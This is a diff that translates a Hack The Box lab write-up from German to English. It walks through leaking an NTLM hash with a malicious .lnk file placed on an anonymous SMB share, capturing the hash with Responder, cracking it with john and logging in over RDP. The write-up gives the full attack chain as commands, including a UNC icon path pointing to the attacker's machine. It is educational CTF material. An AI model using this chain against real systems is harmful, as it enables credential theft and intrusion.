@@ -1,11 +1,11 @@
 ---
 tags: [htb, windows, easy, writeup]
-cve: none (Mark of the Web, kein CVE)
+cve: none (Mark of the Web, no CVE)
 techniques: [smb-enum, ntlm-leak, hash-cracking]
 ---
 # LinkItUp (HTB)
 
-| Feld               | Wert            |
+| Field              | Value           |
 | ------------------ | --------------- |
 | OS                 | Windows         |
 | Difficulty         | Easy            |
@@ -13,11 +13,11 @@ techniques: [smb-enum, ntlm-leak, hash-cracking]
 | Attacker IP (tun0) | `<tun0-ip>`     |
 
 > [!info] Kill Chain
-> [[SMB Enumeration]] (anon Share) → bösartige `.lnk` auf Share → Opfer-Rechtsklick löst [[NTLM Hash Leak]] aus → Hash via [[Responder]] gefangen → [[Hash Cracking]] (john) → Creds → RDP → **Flag**
+> [[SMB Enumeration]] (anon share) → malicious `.lnk` on the share → victim right-click triggers [[NTLM Hash Leak]] → hash captured via [[Responder]] → [[Hash Cracking]] (john) → creds → RDP → **flag**
 
-> [!note] Die Lücke – was die Auth auslöst
-> Eine `.lnk` enthält einen **Icon-Pfad**. Zeigt dieser auf einen UNC-Pfad (`\\<attacker-ip>\share`), muss Windows das Icon über SMB von dort laden, sobald der Explorer die Datei **darstellt** (Ordneransicht / Vorschau / Rechtsklick) – kein Klick auf die Datei nötig.
-> Der SMB-Verbindungsaufbau triggert automatisch die **NTLM-Authentifizierung** → der NTLMv2-Hash des angezeigten Users geht an den UNC-Host (= mein Responder). Betrifft alle Windows-Versionen. Microsoft blockt das nur bei Internet-Downloads via *Mark of the Web* → **kein CVE**; Dateien auf internen **Shares** tragen kein MotW → weiter verwundbar. Mechanismus: [[NTLM Hash Leak]].
+> [!note] The flaw – what triggers the auth
+> A `.lnk` contains an **icon path**. If it points to a UNC path (`\\<attacker-ip>\share`), Windows must load the icon over SMB from there as soon as Explorer **renders** the file (folder view / preview / right-click) – no click on the file needed.
+> Establishing the SMB connection automatically triggers **NTLM authentication** → the NTLMv2 hash of the displayed user goes to the UNC host (= my Responder). Affects all Windows versions. Microsoft only blocks this for internet downloads via *Mark of the Web* → **no CVE**; files on internal **shares** carry no MotW → still vulnerable. Mechanism: [[NTLM Hash Leak]].
 
 ---
 
@@ -27,61 +27,61 @@ techniques: [smb-enum, ntlm-leak, hash-cracking]
 ```bash
 nmap -sV -sC 10.129.234.64
 ```
-- `-sV` = Dienst-Versionen, `-sC` = Standard-Skripte
-- SMB (445) + RDP (3389) offen → Angriffsweg: Einstieg über SMB, finaler Zugriff per RDP
+- `-sV` = service versions, `-sC` = default scripts
+- SMB (445) + RDP (3389) open → attack path: entry via SMB, final access via RDP
 
-## Shares anonym → [[SMB Enumeration]]
+## Shares anonymously → [[SMB Enumeration]]
 ```bash
 smbclient -L //10.129.234.64/share -N
-# => beschreibbarer Share gefunden
+# => writable share found
 ```
-- `-N` = ohne Passwort (Null-Session), prüft anonymen Zugriff → bei fehlkonfigurierten Shares häufig möglich
-- Share muss **beschreibbar** sein (nicht nur lesbar) → sonst lässt sich keine eigene Datei ablegen
+- `-N` = without password (null session), checks for anonymous access → often possible on misconfigured shares
+- the share must be **writable** (not just readable) → otherwise no own file can be placed
 
 ---
 
 # 2 · Credential Access → [[NTLM Hash Leak]]
 
-## 2.1 Bösartige `.lnk` bauen
-`poc.c` so anpassen, dass die `.lnk` auf die **eigene IP** zeigt (`\\<tun0-ip>\share`).
+## 2.1 Building the malicious `.lnk`
+`poc.c` adjusted so the `.lnk` points to **my own IP** (`\\<tun0-ip>\share`).
 ```bash
-x86_64-w64-mingw32-gcc -o poc poc.c   # unter Linux kompilieren => poc.exe
-wine poc.exe                          # .exe ausführen => poc.lnk
+x86_64-w64-mingw32-gcc -o poc poc.c   # compile on Linux => poc.exe
+wine poc.exe                          # run the .exe => poc.lnk
 ```
-> `mingw32-gcc` kompiliert Windows-Binaries unter Linux, `wine` führt sie aus.
-- der entscheidende Teil ist der **Icon-Pfad** der `.lnk` → zeigt er auf `\\<tun0-ip>\share`, lädt Windows das Icon über SMB von meiner Maschine, sobald der Explorer die Datei darstellt → dabei wird der NTLM-Hash übermittelt
-- im `poc.c` die **eigene tun0-IP** eintragen, nicht die der Box (sonst wird der Hash an die falsche Adresse gesendet)
+> `mingw32-gcc` compiles Windows binaries on Linux, `wine` runs them.
+- the decisive part is the **icon path** of the `.lnk` → if it points to `\\<tun0-ip>\share`, Windows loads the icon over SMB from my machine as soon as Explorer renders the file → the NTLM hash is transmitted in the process
+- the **own tun0 IP** goes in `poc.c`, not the box's (otherwise the hash is sent to the wrong address)
 
-## 2.2 `.lnk` auf den Share legen
+## 2.2 Placing the `.lnk` on the share
 ```bash
 smbclient //10.129.234.64/share -N -c 'put poc.lnk'
 ```
-- `put` lädt die Datei auf den Share → der simulierte User öffnet dort den Ordner
-- schon das **Darstellen** der Datei im Explorer löst das Icon-Rendering aus (kein Klick/Öffnen der `.lnk` nötig) → SMB-Verbindung zu mir → Hash wird übertragen
+- `put` uploads the file to the share → the simulated user opens that folder
+- merely **rendering** the file in Explorer triggers the icon rendering (no click/open of the `.lnk` needed) → SMB connection to me → hash is transmitted
 
-## 2.3 Hash abfangen → [[Responder]]
+## 2.3 Capturing the hash → [[Responder]]
 ```bash
 responder -I tun0 -P
-# wartet auf SMB-Auth; sobald der User den Ordner ansieht => NTLMv2-Hash erscheint
+# waits for SMB auth; once the user views the folder => NTLMv2 hash appears
 ```
-- Responder emuliert den SMB-Server, nimmt die Authentifizierung entgegen und protokolliert den Hash
-- `-I tun0` = lauscht auf dem VPN-Interface → warten, bis der Hash in der Konsole erscheint
+- Responder emulates the SMB server, accepts the authentication and logs the hash
+- `-I tun0` = listens on the VPN interface → the hash appears in the console once the folder is viewed
 
-## 2.4 Hash cracken → [[Hash Cracking]]
+## 2.4 Cracking the hash → [[Hash Cracking]]
 ```bash
 john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt
-# => Klartext-Passwort
+# => plaintext password
 ```
-- NTLMv2 ist nicht für Pass-the-Hash geeignet → muss offline geknackt werden, um das Klartext-Passwort zu erhalten
-- `john` hasht jedes Wort aus `rockyou.txt` und vergleicht mit dem Ziel-Hash → Treffer = Passwort
+- NTLMv2 is not suitable for pass-the-hash → it must be cracked offline to obtain the plaintext password
+- `john` hashes every word from `rockyou.txt` and compares it with the target hash → match = password
 
 ---
 
-# 3 · Zugriff → Flag
+# 3 · Access → Flag
 
 ```bash
 xfreerdp3 /v:10.129.234.64 /u:<user> /p:<password> /cert:ignore
-# => Desktop, Flag auslesen
+# => desktop, flag read
 ```
-- mit den Credentials per RDP (3389) anmelden. `/cert:ignore` akzeptiert das selbstsignierte Zertifikat
-- Zugriff auf den Desktop → Flag auslesen
+- login via RDP (3389) with the credentials. `/cert:ignore` accepts the self-signed certificate
+- access to the desktop → flag read
